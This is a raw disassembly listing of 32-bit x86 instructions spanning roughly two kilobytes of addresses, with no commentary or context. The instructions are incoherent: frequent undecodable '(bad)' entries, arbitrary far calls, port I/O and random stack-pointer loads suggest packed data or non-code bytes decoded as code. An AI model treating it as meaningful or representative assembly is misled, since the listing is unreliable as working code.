  51dc32:	mov    edi,0xefe9f0ae
  51dc37:	cli    
  51dc38:	cwde   
  51dc39:	pusha  
  51dc3a:	and    BYTE PTR [ebx+0x52],al
  51dc3d:	dec    edx
  51dc3e:	cs int 0x95
  51dc41:	add    dl,BYTE PTR [edx-0x25226c5f]
  51dc47:	daa    
  51dc48:	sub    cl,BYTE PTR [ecx]
  51dc4a:	mov    ecx,0xaccfa94f
  51dc4f:	dec    edi
  51dc50:	clc    
  51dc51:	push   bx
  51dc53:	mov    esp,0xe182e67c
  51dc58:	sbb    esp,0xbf55d49d
  51dc5e:	push   eax
  51dc5f:	push   esi
  51dc60:	aas    
  51dc61:	push   eax
  51dc62:	jecxz  0x51dcc4
  51dc64:	mov    esp,0x19b47a67
  51dc69:	inc    esp
  51dc6a:	cdq    
  51dc6b:	and    DWORD PTR [eax+edx*8+0x5b],ebp
  51dc6f:	mov    cs,WORD PTR [edi*1-0x64dd4837]
  51dc76:	call   0x92ea8a1e
  51dc7b:	cmp    ah,BYTE PTR [ebx]
  51dc7d:	dec    esi
  51dc7e:	sbb    esi,DWORD PTR [edi-0x51]
  51dc81:	ds sub al,0xa7
  51dc84:	mov    ebx,0x688ef70c
  51dc89:	std    
  51dc8a:	dec    ebx
  51dc8b:	out    dx,eax
  51dc8c:	out    dx,al
  51dc8d:	adc    BYTE PTR [ebx],0xd4
  51dc90:	push   ecx
  51dc91:	call   0x67f9:0x5983e0a3
  51dc98:	sahf   
  51dc99:	mov    esp,0x87cd91af
  51dc9e:	adc    al,0xf3
  51dca0:	mov    bl,0x14
  51dca2:	push   esi
  51dca3:	mov    ds:0x76574b8b,al
  51dca8:	and    DWORD PTR [esi],ecx
  51dcaa:	inc    edx
  51dcab:	inc    esp
  51dcac:	ret    0x7c56
  51dcaf:	mov    ebp,0xdea4b4c0
  51dcb4:	int    0x56
  51dcb6:	and    ebp,ebp
  51dcb8:	mov    bl,0x87
  51dcba:	repnz push esp
  51dcbc:	mov    ebx,ss
  51dcbe:	jg     0x51dcd0
  51dcc0:	(bad)  
  51dcc2:	repz xchg edx,eax
  51dcc4:	or     esi,ebx
  51dcc6:	inc    esi
  51dcc7:	cmp    dh,BYTE PTR [edi+0x56a863e9]
  51dccd:	int3   
  51dcce:	mov    al,ds:0x7daf4866
  51dcd3:	popa   
  51dcd4:	add    DWORD PTR [ecx+0x6e640a63],edi
  51dcda:	cmc    
  51dcdb:	loope  0x51dc90
  51dcdd:	fucomi st,st(5)
  51dcdf:	jne    0x51dd16
  51dce1:	in     eax,0xbc
  51dce3:	mov    ds:0x3d767de,eax
  51dce8:	aam    0x31
  51dcea:	push   cs
  51dceb:	int    0x8
  51dced:	dec    edx
  51dcee:	push   cs
  51dcef:	aaa    
  51dcf0:	fwait
  51dcf1:	inc    edi
  51dcf2:	sbb    edi,edx
  51dcf4:	jp     0x51dcc0
  51dcf6:	pop    eax
  51dcf7:	cdq    
  51dcf8:	bound  esi,QWORD PTR [edi-0x1f]
  51dcfb:	fimul  WORD PTR [edx]
  51dcfd:	imul   edx,DWORD PTR [ecx],0x162c069b
  51dd03:	test   BYTE PTR [ecx],dh
  51dd05:	sbb    BYTE PTR [esi],bh
  51dd07:	sub    bl,BYTE PTR [ecx+0xe08c4c9]
  51dd0d:	push   ds
  51dd0e:	ja     0x51dd23
  51dd10:	mov    dh,0x8e
  51dd12:	fld    QWORD PTR [edx+0x2b]
  51dd15:	(bad)  
  51dd16:	add    dh,BYTE PTR [eax-0x619f10e0]
  51dd1c:	push   edi
  51dd1d:	xchg   edx,eax
  51dd1e:	cmp    eax,0xa326d9e3
  51dd23:	cmp    DWORD PTR [edi+ebx*4-0x6b79bd8c],esp
  51dd2a:	sub    BYTE PTR ds:0xf63292c0,0x70
  51dd31:	ss xchg edi,eax
  51dd33:	das    
  51dd34:	cli    
  51dd35:	jp     0x51dd1c
  51dd37:	repz dec esi
  51dd39:	sbb    DWORD PTR [esp],0x2fdea708
  51dd40:	fmul   QWORD PTR [ecx+0x388f283b]
  51dd46:	jle    0x51dd26
  51dd48:	retf   0xa2a3
  51dd4b:	add    cl,BYTE PTR [edi-0x222f9304]
  51dd51:	pushf  
  51dd52:	mov    esp,DWORD PTR ds:0x1343da83
  51dd58:	cli    
  51dd59:	jl     0x51dd38
  51dd5b:	jmp    0xdb83c659
  51dd60:	pop    es
  51dd61:	js     0x51dda2
  51dd63:	and    al,0x88
  51dd65:	mov    dl,0x48
  51dd67:	in     al,dx
  51dd68:	xor    bl,ch
  51dd6a:	cmp    dh,bl
  51dd6c:	xchg   BYTE PTR [ebp-0x49b86c61],ch
  51dd72:	enter  0xb652,0x74
  51dd76:	cmp    ecx,ebp
  51dd78:	out    0xa9,al
  51dd7a:	loopne 0x51dd58
  51dd7c:	cmp    al,0xb
  51dd7e:	and    bl,BYTE PTR [eax-0x47]
  51dd81:	cmp    DWORD PTR [esp+ebx*8-0x137ea239],0xffffffc4
  51dd89:	adc    BYTE PTR [edx],dl
  51dd8b:	test   DWORD PTR [edi+0x26093197],eax
  51dd91:	sub    cl,BYTE PTR [edx+0x7ad488ff]
  51dd97:	stos   BYTE PTR es:[edi],al
  51dd98:	lahf   
  51dd99:	mov    edx,0x2d8d3f8c
  51dd9e:	scas   eax,DWORD PTR es:[edi]
  51dd9f:	in     al,0xc4
  51dda1:	mov    ecx,0x1a9533e1
  51dda6:	lock imul ecx,ebx,0x34
  51ddaa:	(bad)  
  51ddab:	aaa    
  51ddac:	add    DWORD PTR [ebp+ebp*1-0x103758b9],0x5b3a2765
  51ddb7:	jno    0x51dd82
  51ddb9:	(bad)  
  51ddbb:	ret    
  51ddbc:	imul   edi,DWORD PTR [edi],0xa7d972b4
  51ddc2:	adc    eax,0xf97831e9
  51ddc7:	loope  0x51de03
  51ddc9:	mov    ch,0x62
  51ddcb:	in     eax,dx
  51ddcc:	(bad)  
  51ddcd:	popa   
  51ddce:	ds cmp DWORD PTR gs:[ebp+0x47f25c1f],esp
  51ddd6:	pop    eax
  51ddd7:	mov    BYTE PTR [ebx+edi*4],ch
  51ddda:	add    ch,BYTE PTR [ecx+edx*4]
  51dddd:	lea    edi,[eax-0x64]
  51dde0:	(bad)  
  51dde1:	push   edi
  51dde2:	out    0xdd,al
  51dde4:	dec    edi
  51dde5:	stc    
  51dde6:	fwait
  51dde7:	mov    eax,0xfbfbb756
  51ddec:	ss sbb eax,0x5daad159
  51ddf2:	addr16 shl eax,1
  51ddf5:	loop   0x51de10
  51ddf7:	xor    al,0xaa
  51ddf9:	mov    al,0x9b
  51ddfb:	mov    esp,esi
  51ddfd:	mov    dh,BYTE PTR [esi-0x13]
  51de00:	pop    eax
  51de01:	xor    BYTE PTR [esi+0x64f77ed8],0x85
  51de08:	leavew 
  51de0a:	jae    0x51dda3
  51de0c:	test   BYTE PTR [esi-0x2365307c],0x5d
  51de13:	shr    DWORD PTR [esi-0x560873f],0xe9
  51de1a:	pop    ss
  51de1b:	pop    esp
  51de1c:	mov    ecx,0xa972d610
  51de21:	sbb    dh,BYTE PTR [edi]
  51de23:	stc    
  51de24:	xchg   edx,eax
  51de25:	leave  
  51de26:	enter  0xa0d5,0x6
  51de2a:	pop    es
  51de2b:	pop    edx
  51de2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51de2d:	push   ds
  51de2e:	push   es
  51de2f:	es jnp 0x51de67
  51de32:	adc    bl,bl
  51de34:	pop    ebp
  51de35:	jnp    0x51dea3
  51de37:	in     eax,0x30
  51de39:	jecxz  0x51de41
  51de3b:	jnp    0x51de35
  51de3d:	cmp    eax,0xabd0583
  51de42:	mov    BYTE PTR [edi],ch
  51de44:	jecxz  0x51ddda
  51de46:	cdq    
  51de47:	push   eax
  51de48:	jle    0x51dddc
  51de4a:	loopne 0x51de66
  51de4c:	mul    BYTE PTR [ecx+0x6058b3a1]
  51de52:	inc    ebx
  51de53:	inc    esi
  51de54:	lods   al,BYTE PTR ds:[esi]
  51de55:	scas   eax,DWORD PTR es:[edi]
  51de56:	pop    edx
  51de57:	jo     0x51deb3
  51de59:	or     al,0xa3
  51de5b:	jno    0x51de35
  51de5d:	call   0x6e8c:0xe8eaa4da
  51de64:	fidivr WORD PTR [ebx]
  51de66:	mov    edx,0x931ce4d1
  51de6b:	lods   al,BYTE PTR ds:[esi]
  51de6c:	jbe    0x51ded3
  51de6e:	jnp    0x51de19
  51de70:	test   BYTE PTR [edx+0x2a71986a],cl
  51de76:	adc    al,0x58
  51de78:	int    0x6a
  51de7a:	add    DWORD PTR [ebp-0x62237d61],esi
  51de80:	dec    ebp
  51de81:	add    eax,0xf9663897
  51de86:	inc    eax
  51de87:	ret    0x8a5e
  51de8a:	mov    dh,0xe6
  51de8c:	jbe    0x51def1
  51de8e:	popf   
  51de8f:	mov    dl,0xd1
  51de91:	lock xor DWORD PTR [edx+0x61],esi
  51de95:	sub    DWORD PTR [ebx],eax
  51de97:	mov    ebx,0x2d6e07af
  51de9d:	ins    BYTE PTR es:[edi],dx
  51de9e:	call   0x5daa:0x3010ccdd
  51dea5:	ficomp DWORD PTR cs:[edx-0x5a8d9750]
  51deac:	adc    ecx,edi
  51deae:	mov    edx,0xd35c482e
  51deb3:	xchg   dl,ch
  51deb5:	dec    edi
  51deb6:	cmp    BYTE PTR [edi],bl
  51deb8:	cli    
  51deb9:	inc    edx
  51deba:	nop
  51debb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51debc:	and    al,0x2e
  51debe:	dec    ebx
  51debf:	or     edx,DWORD PTR [edx+0x10]
  51dec2:	sbb    al,0x3b
  51dec4:	mov    ds:0xcce92a04,al
  51dec9:	adc    DWORD PTR [eax-0x26],ecx
  51decc:	rol    BYTE PTR [edx+0x372c1258],cl
  51ded2:	call   0x4c54:0xd5b54479
  51ded9:	call   0x5e835b0d
  51dede:	int3   
  51dedf:	popa   
  51dee0:	lods   al,BYTE PTR ds:[esi]
  51dee1:	rcl    DWORD PTR [edx-0x711fbc06],1
  51dee7:	adc    BYTE PTR [ebp+0x18],ch
  51deea:	jne    0x51deda
  51deec:	call   DWORD PTR [edx-0x5307c32f]
  51def2:	das    
  51def3:	cld    
  51def4:	(bad)  [eax]
  51def6:	sub    edi,DWORD PTR [esp+ecx*4+0x5dfff62]
  51defd:	xchg   BYTE PTR [edx],bh
  51deff:	mov    DWORD PTR [esi+esi*4-0x69],esp
  51df03:	or     BYTE PTR [esi+0x4],bl
  51df06:	push   eax
  51df07:	dec    ecx
  51df08:	int3   
  51df09:	dec    eax
  51df0a:	fld    st(0)
  51df0c:	xchg   edi,eax
  51df0d:	jl     0x51decb
  51df0f:	rcl    DWORD PTR [edi+ebx*1-0x65],cl
  51df13:	pop    ebx
  51df14:	jge    0x51dea9
  51df16:	(bad)  
  51df17:	adc    ah,bh
  51df19:	push   ebx
  51df1a:	sub    cl,bl
  51df1c:	jbe    0x51def3
  51df1e:	jmp    DWORD PTR [edi]
  51df20:	xchg   cx,ax
  51df22:	dec    edi
  51df23:	adc    al,0xa2
  51df25:	retf   
  51df26:	sbb    BYTE PTR [ebp+0x67],cl
  51df29:	sub    DWORD PTR [eax+0x72],eax
  51df2c:	push   ebx
  51df2d:	cmp    DWORD PTR [esi],0x79525def
  51df33:	out    0xc8,eax
  51df35:	out    0xf5,eax
  51df37:	push   esp
  51df38:	and    bh,BYTE PTR [ecx]
  51df3a:	(bad)  
  51df3b:	mov    ecx,edx
  51df3d:	mov    al,ds:0xd6ec15a5
  51df42:	mov    ds:0xca37c7e1,eax
  51df47:	call   0x6138:0xc5d5219e
  51df4e:	or     DWORD PTR [edx],ecx
  51df50:	retf   
  51df51:	adc    al,0x92
  51df53:	repz jmp edi
  51df56:	and    al,0x3e
  51df58:	retf   0xcb0b
  51df5b:	(bad)  [ecx-0x2dc88f98]
  51df61:	inc    eax
  51df62:	cmp    al,0x5d
  51df64:	pop    eax
  51df65:	xor    eax,0xa11a5d42
  51df6a:	jnp    0x51df80
  51df6c:	pop    edi
  51df6d:	cmc    
  51df6e:	les    ebx,FWORD PTR [ebp+0x47a3e069]
  51df74:	lea    esi,[ecx-0x3]
  51df77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51df78:	aaa    
  51df79:	or     BYTE PTR [esi-0x6fade1e5],dl
  51df7f:	mov    ebp,0x69647978
  51df84:	sbb    al,0x24
  51df86:	jne    0x51df57
  51df88:	mov    eax,eax
  51df8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51df8b:	sbb    ch,cl
  51df8d:	pop    eax
  51df8e:	inc    esi
  51df8f:	or     ah,BYTE PTR [eax+0x79b582aa]
  51df95:	adc    al,0xb7
  51df97:	xchg   DWORD PTR [ebx+esi*4+0x20],esi
  51df9b:	sub    bh,dh
  51df9d:	outs   dx,DWORD PTR ds:[esi]
  51df9e:	or     DWORD PTR ds:0xcc4cec62,esp
  51dfa4:	(bad)  
  51dfa6:	adc    ch,BYTE PTR [esi]
  51dfa8:	jb     0x51dfd6
  51dfaa:	ins    BYTE PTR es:[edi],dx
  51dfab:	mov    esi,edx
  51dfad:	cs cmc 
  51dfaf:	fcmovne st,st(6)
  51dfb1:	xchg   ecx,eax
  51dfb2:	and    dh,al
  51dfb4:	mov    ds:0x2dcd95a3,al
  51dfb9:	push   edx
  51dfba:	out    dx,eax
  51dfbb:	(bad)  
  51dfbc:	xchg   esp,eax
  51dfbd:	cli    
  51dfbe:	int3   
  51dfbf:	xor    eax,0x476128ff
  51dfc4:	adc    DWORD PTR [edi-0x70],0xffffff8f
  51dfc8:	mov    DWORD PTR [edi],eax
  51dfca:	pop    ebp
  51dfcb:	cmp    al,0x30
  51dfcd:	dec    ebp
  51dfce:	push   DWORD PTR [edi-0x3e]
  51dfd1:	dec    ebx
  51dfd2:	jne    0x51dfc2
  51dfd4:	xor    dl,BYTE PTR ds:[esi]
  51dfd7:	xchg   ebx,eax
  51dfd8:	pop    ss
  51dfd9:	lea    ebp,[edx+ebx*8-0x7bc7e13c]
  51dfe0:	sbb    DWORD PTR fs:[edx+esi*1-0x38],ebp
  51dfe5:	pop    ss
  51dfe6:	ret    0x1be0
  51dfe9:	jno    0x51dfda
  51dfeb:	pop    edi
  51dfec:	outs   dx,BYTE PTR ds:[esi]
  51dfed:	and    DWORD PTR [eax+0x3e],esp
  51dff0:	or     eax,0xbb4c669a
  51dff5:	add    dl,ah
  51dff7:	xor    al,0x5c
  51dff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51dffb:	add    DWORD PTR [ebx],edi
  51dffd:	lods   eax,DWORD PTR ds:[esi]
  51dffe:	cli    
  51dfff:	xchg   edi,eax
  51e000:	mov    ebx,DWORD PTR [ecx-0x2b8b8d53]
  51e006:	(bad)  
  51e007:	std    
  51e008:	je     0x51e05a
  51e00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e00b:	shr    edi,cl
  51e00d:	js     0x51e01b
  51e00f:	mov    bl,bh
  51e011:	retf   0x847e
  51e014:	ror    BYTE PTR [ecx-0xb],1
  51e017:	leave  
  51e018:	das    
  51e019:	mov    cl,0xeb
  51e01b:	pop    ecx
  51e01c:	dec    ebx
  51e01d:	sub    eax,0x6730f7bc
  51e022:	fdivrp st(1),st
  51e024:	jb     0x51e04a
  51e026:	repnz cmp eax,DWORD PTR [edx+0x2e]
  51e02a:	xor    al,0x56
  51e02c:	jmp    0xcb5e:0xb992faf2
  51e033:	loope  0x51e0a0
  51e035:	call   0x53b2:0xa7a944b8
  51e03c:	ins    DWORD PTR es:[edi],dx
  51e03d:	rol    dh,0xc8
  51e040:	aad    0x10
  51e042:	sti    
  51e043:	pop    edi
  51e044:	lock lds ebx,FWORD PTR ss:[eax+0x67]
  51e049:	xor    ch,BYTE PTR [edi]
  51e04b:	(bad)  [ebx+ecx*4+0x67]
  51e04f:	xchg   edx,eax
  51e050:	or     eax,0xf61a6790
  51e055:	jbe    0x51e086
  51e057:	popf   
  51e058:	retf   0x98f5
  51e05b:	xchg   ebp,eax
  51e05c:	stos   DWORD PTR es:[edi],eax
  51e05d:	adc    al,0x73
  51e05f:	jnp    0x51e072
  51e061:	into   
  51e062:	iret   
  51e063:	adc    eax,0x4acfedaf
  51e068:	sub    eax,0xb6feb02d
  51e06d:	or     DWORD PTR gs:[edi],edi
  51e070:	mov    dh,0x1a
  51e072:	stos   DWORD PTR es:[edi],eax
  51e073:	xchg   ecx,eax
  51e074:	dec    ebx
  51e075:	dec    ebx
  51e076:	stc    
  51e077:	popa   
  51e078:	sub    ch,BYTE PTR [edx]
  51e07a:	mov    ecx,DWORD PTR [ebx-0xe]
  51e07d:	daa    
  51e07e:	mov    bl,0xc2
  51e080:	jge    0x51e0dc
  51e082:	int    0xfe
  51e084:	arpl   cx,bp
  51e086:	pop    edx
  51e087:	in     al,dx
  51e088:	ins    DWORD PTR es:[edi],dx
  51e089:	fs push edx
  51e08b:	push   ax
  51e08d:	popf   
  51e08e:	xchg   BYTE PTR [esi],ch
  51e090:	std    
  51e091:	shl    BYTE PTR [ebp+0x411a58ee],1
  51e097:	out    dx,eax
  51e098:	jg     0x51e052
  51e09a:	jmp    0xefea:0xbf3e28a8
  51e0a1:	pop    edx
  51e0a2:	cmp    eax,0x3fb388b4
  51e0a7:	dec    ebp
  51e0a8:	mul    BYTE PTR [edx+0x5b3af9a7]
  51e0ae:	iret   
  51e0af:	int    0xa8
  51e0b1:	mov    ebx,0x2ba9cccf
  51e0b6:	dec    esp
  51e0b7:	lods   al,BYTE PTR ds:[esi]
  51e0b8:	xor    edi,DWORD PTR [ecx-0x4]
  51e0bb:	loope  0x51e0b6
  51e0bd:	in     eax,dx
  51e0be:	and    eax,0x84d2526e
  51e0c3:	lods   al,BYTE PTR ds:[esi]
  51e0c4:	dec    esi
  51e0c5:	mov    al,ds:0x4e488fb1
  51e0ca:	push   es
  51e0cb:	out    0x9d,eax
  51e0cd:	pusha  
  51e0ce:	and    DWORD PTR [ebx+0x17daaed2],edx
  51e0d4:	jecxz  0x51e0d6
  51e0d6:	fisttp QWORD PTR [ecx+0x5da49883]
  51e0dc:	adc    DWORD PTR [ebp+0x152721b0],edi
  51e0e2:	jle    0x51e0c6
  51e0e4:	or     ecx,DWORD PTR [ecx+edx*1+0x59e1765c]
  51e0eb:	fs jo  0x51e0b5
  51e0ee:	in     eax,0x77
  51e0f0:	adc    al,BYTE PTR [eax+0x676b88d2]
  51e0f6:	jnp    0x51e157
  51e0f8:	es (bad) 
  51e0fa:	push   0x6c
  51e0fc:	ret    0x2d35
  51e0ff:	imul   ebp,DWORD PTR [edx-0x37],0xddb7edd1
  51e106:	xchg   BYTE PTR [ebp+0x265b94fb],ah
  51e10c:	and    BYTE PTR [ecx],cl
  51e10e:	inc    eax
  51e10f:	cmp    ch,dh
  51e111:	shr    BYTE PTR [esi],0x0
  51e114:	in     eax,0x1b
  51e116:	adc    ebx,eax
  51e118:	dec    ebp
  51e119:	push   eax
  51e11a:	adc    dh,al
  51e11c:	ja     0x51e141
  51e11e:	cdq    
  51e11f:	cli    
  51e120:	mov    esi,0x9a151e52
  51e125:	out    0x6c,eax
  51e127:	ja     0x51e12e
  51e129:	push   ebp
  51e12a:	(bad)  
  51e12b:	and    eax,0x50ad42b4
  51e130:	fcom   QWORD PTR [ecx+0x71]
  51e133:	and    ch,BYTE PTR [ebx+0x4c76413f]
  51e139:	mov    cl,BYTE PTR [edx-0x53]
  51e13c:	cld    
  51e13d:	rcl    BYTE PTR [edx+edi*1+0x591a8733],cl
  51e144:	adc    dl,BYTE PTR [ebx]
  51e146:	dec    esp
  51e147:	xor    eax,DWORD PTR [edi+0x1caae2b5]
  51e14d:	jp     0x51e1b0
  51e14f:	std    
  51e150:	pop    eax
  51e151:	pushf  
  51e152:	mov    ebp,0xc0edc544
  51e157:	or     edx,edx
  51e159:	xlat   BYTE PTR ds:[ebx]
  51e15a:	add    edi,eax
  51e15c:	xchg   edi,eax
  51e15d:	xchg   ebp,eax
  51e15e:	sbb    edx,edx
  51e160:	mov    esp,0xb8a9d979
  51e165:	xchg   BYTE PTR [edi],al
  51e167:	sar    DWORD PTR [edi*8+0x628bc153],cl
  51e16e:	cmp    DWORD PTR [edx-0x9bb78fb],edi
  51e174:	rcr    DWORD PTR [ecx],1
  51e176:	jbe    0x51e13e
  51e178:	aas    
  51e179:	xchg   ebp,eax
  51e17a:	inc    eax
  51e17b:	aad    0xc1
  51e17d:	xchg   ebp,eax
  51e17e:	int    0x77
  51e180:	fs sub eax,0x81acecc4
  51e186:	rcl    DWORD PTR [ebx+esi*4+0x6b230e47],cl
  51e18d:	lods   eax,DWORD PTR ds:[esi]
  51e18e:	jns    0x51e209
  51e190:	jmp    0xe14d:0xc4cf6ce
  51e197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e198:	jmp    0x1153c325
  51e19d:	in     eax,dx
  51e19e:	popf   
  51e19f:	lahf   
  51e1a0:	inc    edi
  51e1a1:	sub    eax,DWORD PTR [eax-0x18a5f68c]
  51e1a7:	(bad)  
  51e1a8:	fwait
  51e1a9:	dec    edi
  51e1aa:	sahf   
  51e1ab:	lock lock addr16 pop ebx
  51e1af:	jl     0x51e1b4
  51e1b1:	pop    eax
  51e1b2:	lods   al,BYTE PTR ds:[esi]
  51e1b3:	mov    dl,0x22
  51e1b5:	mov    edx,0xef976c8d
  51e1ba:	jle    0x51e201
  51e1bc:	adc    cl,al
  51e1be:	fcomi  st,st(5)
  51e1c0:	jecxz  0x51e233
  51e1c2:	inc    eax
  51e1c3:	mov    ds:0xf25d0f5b,eax
  51e1c8:	push   ecx
  51e1c9:	push   ebp
  51e1ca:	addr16 popf 
  51e1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51e1cd:	jnp    0x51e14f
  51e1cf:	mov    esp,esi
  51e1d1:	dec    edx
  51e1d2:	ret    
  51e1d3:	cmp    edi,DWORD PTR [ebx]
  51e1d5:	outs   dx,BYTE PTR ds:[esi]
  51e1d6:	dec    edx
  51e1d7:	mov    ecx,DWORD PTR [ebx+0xd]
  51e1da:	inc    esp
  51e1db:	fmul   QWORD PTR [ebx+eax*4]
  51e1de:	inc    ebp
  51e1df:	sti    
  51e1e0:	sar    BYTE PTR [edi],1
  51e1e2:	jg     0x51e16f
  51e1e4:	mov    esi,0x8c0d9629
  51e1e9:	jl     0x51e1cb
  51e1eb:	add    DWORD PTR [ebx-0x13],ecx
  51e1ee:	mov    al,0x40
  51e1f0:	cmp    ch,BYTE PTR [esi+0x3fd80e63]
  51e1f6:	stc    
  51e1f7:	sub    ah,BYTE PTR [esi+0x1a]
  51e1fa:	push   eax
  51e1fb:	addr16 (bad) 
  51e1fd:	xchg   esp,eax
  51e1fe:	jnp    0x51e220
  51e200:	cmc    
  51e201:	mov    cs,edx
  51e203:	mov    al,ds:0x224238f2
  51e208:	xchg   edi,eax
  51e209:	pop    eax
  51e20a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51e20b:	sbb    ch,ah
  51e20d:	push   ss
  51e20e:	inc    esi
  51e20f:	add    DWORD PTR [esi],ecx
  51e211:	cmc    
  51e212:	inc    edi
  51e213:	lods   al,BYTE PTR ds:[esi]
  51e214:	js     0x51e1d8
  51e216:	add    ah,BYTE PTR [ebx-0x6f]
  51e219:	xor    eax,0xb5d06f8c
  51e21e:	lods   al,BYTE PTR ds:[esi]
  51e21f:	ja     0x51e212
  51e221:	scas   eax,DWORD PTR es:[edi]
  51e222:	mov    ah,0x19
  51e224:	jae    0x51e298
  51e226:	out    dx,eax
  51e227:	mov    ebx,0x8e584575
  51e22c:	mov    ch,BYTE PTR [eax]
  51e22e:	cmp    DWORD PTR [esi+0xf],edx
  51e231:	adc    ebx,ebp
  51e233:	pop    ebx
  51e234:	cmp    al,bh
  51e236:	fst    DWORD PTR [ebp+0x2dec217a]
  51e23c:	inc    eax
  51e23d:	mov    edi,0xe6d2128a
  51e242:	xor    bl,dh
  51e244:	cmp    bl,bl
  51e246:	adc    DWORD PTR [edx-0x31973222],esi
  51e24c:	mov    ds:0x6445ef4a,eax
  51e251:	fcomp  DWORD PTR [edx-0x67]
  51e254:	and    BYTE PTR [esi-0x573a9f69],ch
  51e25a:	repnz shl BYTE PTR [ebx],1
  51e25d:	fsubr  QWORD PTR [esp+ebx*4-0x48]
  51e261:	js     0x51e247
  51e263:	leave  
  51e264:	sbb    edx,edx
  51e266:	pop    ss
  51e267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e268:	xchg   ebp,eax
  51e269:	aad    0xfb
  51e26b:	cmp    edi,ecx
  51e26d:	fisttp DWORD PTR [edi+0x39]
  51e270:	mov    ebp,0x347351be
  51e275:	adc    esp,DWORD PTR [ebp+edx*8+0x70]
  51e279:	in     eax,0xad
  51e27b:	sbb    eax,0x4a18dc69
  51e280:	mov    ecx,0xba8abe6d
  51e285:	and    BYTE PTR [ecx+0x0],bl
  51e288:	pop    ds
  51e289:	pop    edx
  51e28a:	cwde   
  51e28b:	push   ecx
  51e28c:	inc    ecx
  51e28d:	scas   eax,DWORD PTR es:[edi]
  51e28e:	fcomp  QWORD PTR [ecx+0x60]
  51e291:	and    ch,BYTE PTR [ecx-0x13651fed]
  51e297:	int3   
  51e298:	add    ch,BYTE PTR [edx+esi*4+0x10]
  51e29c:	fnstcw WORD PTR [ebx-0x34674aa3]
  51e2a2:	sahf   
  51e2a3:	mov    ebp,0x2b500838
  51e2a8:	pop    ecx
  51e2a9:	pop    eax
  51e2aa:	test   DWORD PTR [eax+edi*4],esi
  51e2ad:	xchg   ecx,eax
  51e2ae:	das    
  51e2af:	cli    
  51e2b0:	adc    eax,0xbbe2b269
  51e2b5:	clc    
  51e2b6:	cmp    cl,BYTE PTR [edx]
  51e2b8:	xchg   ecx,eax
  51e2b9:	pop    edx
  51e2ba:	js     0x51e262
  51e2bc:	pop    es
  51e2bd:	push   ebp
  51e2be:	jns    0x51e2e8
  51e2c0:	lods   al,BYTE PTR ds:[esi]
  51e2c1:	cwde   
  51e2c2:	sbb    DWORD PTR [ecx-0xfbe61b6],edx
  51e2c8:	add    dh,al
  51e2ca:	dec    edx
  51e2cb:	mov    al,ds:0x3edaa861
  51e2d0:	pop    es
  51e2d1:	pop    esp
  51e2d2:	pushf  
  51e2d3:	out    dx,eax
  51e2d4:	inc    ebp
  51e2d5:	sbb    cl,BYTE PTR [ecx+0x29]
  51e2d8:	mov    al,0xfb
  51e2da:	push   ebp
  51e2db:	mul    DWORD PTR [eax-0x66]
  51e2de:	imul   edx,DWORD PTR [ebp-0x7b],0x71
  51e2e2:	add    eax,0xeba86c2
  51e2e7:	adc    ch,ch
  51e2e9:	mov    al,ds:0x9cc5d7d7
  51e2ee:	push   0xffffff8a
  51e2f0:	mov    al,0x60
  51e2f2:	inc    esp
  51e2f3:	pushf  
  51e2f4:	mov    ds:0x48d2e507,eax
  51e2f9:	int3   
  51e2fa:	pop    ebp
  51e2fb:	loope  0x51e2b7
  51e2fd:	stc    
  51e2fe:	sbb    eax,0xc57441ed
  51e303:	pop    ebx
  51e304:	adc    eax,0xdd99af3c
  51e309:	ins    DWORD PTR es:[edi],dx
  51e30a:	mov    dh,0xf1
  51e30c:	pop    ss
  51e30d:	fsub   st,st(4)
  51e30f:	pop    esi
  51e310:	int3   
  51e311:	stc    
  51e312:	nop
  51e313:	int    0x8e
  51e315:	lods   eax,DWORD PTR ds:[esi]
  51e316:	or     eax,0xa772c93a
  51e31b:	or     DWORD PTR [edi+ecx*4-0x1e],ebp
  51e31f:	xor    BYTE PTR [ebx+0x56],bh
  51e322:	int3   
  51e323:	dec    esi
  51e324:	jge    0x51e302
  51e326:	cmp    BYTE PTR [ebp+0x7b8f7f12],dh
  51e32c:	and    DWORD PTR [edx-0x2812ee29],ecx
  51e332:	scas   al,BYTE PTR es:[edi]
  51e333:	dec    esi
  51e334:	clc    
  51e335:	sti    
  51e336:	jg     0x51e2d8
  51e338:	call   0x6696:0xf02db397
  51e33f:	xchg   ebx,eax
  51e340:	in     al,dx
  51e341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51e342:	rcl    BYTE PTR [eax+0x11],cl
  51e345:	mov    dh,0xb8
  51e347:	pop    esi
  51e348:	xor    DWORD PTR [ecx],edi
  51e34a:	enter  0xdc11,0x71
  51e34e:	retf   0x46a1
  51e351:	ss inc esi
  51e353:	mov    WORD PTR [esp+ecx*1-0x23],?
  51e357:	repz and eax,0x2aea5b3e
  51e35d:	retf   0x7941
  51e360:	outs   dx,BYTE PTR ds:[esi]
  51e361:	xor    DWORD PTR [ebx+0x76c1b1cb],edx
  51e367:	leave  
  51e368:	vpaddsw xmm4,xmm1,XMMWORD PTR [edi]
  51e36c:	xor    bh,ah
  51e36e:	lahf   
  51e36f:	jl     0x51e38e
  51e371:	xlat   BYTE PTR ds:[ebx]
  51e372:	in     eax,0x69
  51e374:	sbb    ebx,DWORD PTR [esi]
  51e376:	scas   al,BYTE PTR es:[edi]
  51e377:	inc    esi
  51e378:	jb     0x51e39f
  51e37a:	(bad)  
  51e37c:	lods   eax,DWORD PTR ds:[esi]
  51e37d:	jp     0x51e30a
  51e37f:	mov    ecx,0xec529567
  51e384:	push   ss
  51e385:	push   esi
  51e386:	paddusb mm4,QWORD PTR [ebx+0x264e21b1]
  51e38d:	mov    eax,0x22f407d3
  51e392:	bound  eax,QWORD PTR [esi]
  51e394:	dec    eax
  51e395:	push   esp
  51e396:	mov    dh,0xec
  51e398:	dec    edx
  51e399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51e39a:	out    dx,al
  51e39b:	push   cs
  51e39c:	retf   
